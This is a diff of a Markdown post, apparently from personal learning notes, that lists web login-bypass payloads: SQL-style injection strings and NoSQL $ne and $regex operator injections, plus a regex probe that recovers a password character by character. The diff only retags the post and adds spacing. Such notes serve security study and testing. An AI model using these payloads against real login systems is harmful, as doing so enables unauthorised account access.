@@ -1,7 +1,7 @@
 ---
 title: WEB LOGIN BYPASS
 date: 2023-05-05 01:35:40 +/-TTTT
-categories: [learning, ctf]
+categories: [learning, web]
 tags: [learning]     # TAG names should always be lowercase
 ---
 
@@ -39,6 +39,7 @@ admin' || '1==1
 admin' || '1'=='1
 ```
 * Operators
+
 ```JS
 # $ne: Not equal
 username[$ne]=xyz&password[$ne]=xyz
@@ -73,7 +74,9 @@ username[$regex]=.*&password[$ne]=xyz
 username[$ne]=xyz&password[$regex]=.*
 username[$regex]=.{6}&password[$ne]=xyz
 ```
+
 After finding usernames, we can also obtain the passwords using the “$regex” operator as the following example.
+
 ```JS
 # Check if the password length is 7 characters.
 username=admin&password[$regex]=^.{7}$
@@ -89,6 +92,7 @@ username=admin&password[$regex]=^sec...$
 
 If the above payloads not working, try changing to a json format.
 We also need to change the value of the Content-Type to “application/json” in the HTTP header.
+
 ```js
 Content-Type: application/json
 
